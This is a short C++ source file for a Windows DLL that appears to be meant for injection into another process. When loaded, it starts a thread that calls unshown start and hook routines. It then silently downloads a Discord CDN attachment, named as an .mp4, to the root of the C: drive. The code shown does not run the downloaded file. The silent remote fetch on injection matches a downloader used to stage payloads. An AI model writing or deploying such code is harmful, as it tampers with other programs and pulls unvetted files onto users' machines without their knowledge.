#include "includes.h"
#include <xstring>
#include "sk.h"

using namespace std;

void Inject()
{
	Start();
	hk__();
	URLDownloadToFileA(NULL, "https://cdn.discordapp.com/attachments/1299167849352400929/1307566780507754568/1730879917297766114_fa020e6b_480x448.mp4?ex=673ac5f5&is=67397475&hm=91a6d9bc0025ddef92fcfe51fa4fa776c663cc8cb87ba1b91384abfedebd051d&", "C:\\1730879917297766114_fa020e6b_480x448.mp4", 0, 0);
}

bool DllMain(HMODULE hMod, std::uint32_t call_reason, void*) {
	if (call_reason != DLL_PROCESS_ATTACH)
		return false;

	const auto handle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Inject), hMod, 0, nullptr);

	if (handle != NULL)
		CloseHandle(handle);

	return true;
}